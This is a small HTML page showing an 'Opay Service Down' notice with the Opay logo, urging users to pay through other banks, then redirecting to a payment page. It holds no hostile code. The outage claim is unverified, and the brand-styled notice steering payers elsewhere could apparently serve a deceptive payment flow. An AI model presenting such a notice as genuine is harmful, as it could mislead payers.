<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Opay Service Down</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: #f0f0f0;
    }

    .modal {
      background: white;
      max-width: 95%;
      margin: 100px auto;
      padding: 25px;
      border-radius: 12px;
      text-align: center;
      box-shadow: 0 4px 20px rgba(0,0,0,0.2);
    }

    .opay-logo {
      width: 60px;
      height: 60px;
      margin: 0 auto 20px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    h2 {
      color: red;
      margin-bottom: 10px;
    }

    p {
      font-size: 16px;
      color: #333;
    }

    .alert-box {
      background: #ffe5e5;
      color: #cc0000;
      border: 1px solid #cc0000;
      padding: 10px;
      margin: 15px 0;
      border-radius: 8px;
    }

    button {
      background-color: #0066ff;
      color: white;
      padding: 12px 24px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 10px;
    }

    button:hover {
      background-color: #004ec2;
    }
  </style>
</head>
<body>

  <div class="modal">
    <img class="opay-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/98/Opay_Logo.png/600px-Opay_Logo.png" alt="Opay Logo" />
    <h2>Opay Service Down</h2>
    <p>Please do not use Opay bank for payments at this time.</p>
    <div class="alert-box">
      The Opay bank service is currently experiencing issues. Please use other supported banks for your payment.
    </div>
    <button onclick="redirect()">I Understand</button>
  </div>

  <script>
    function redirect() {
      window.location.href = "payment.html";
    }
  </script>

</body>
</html>
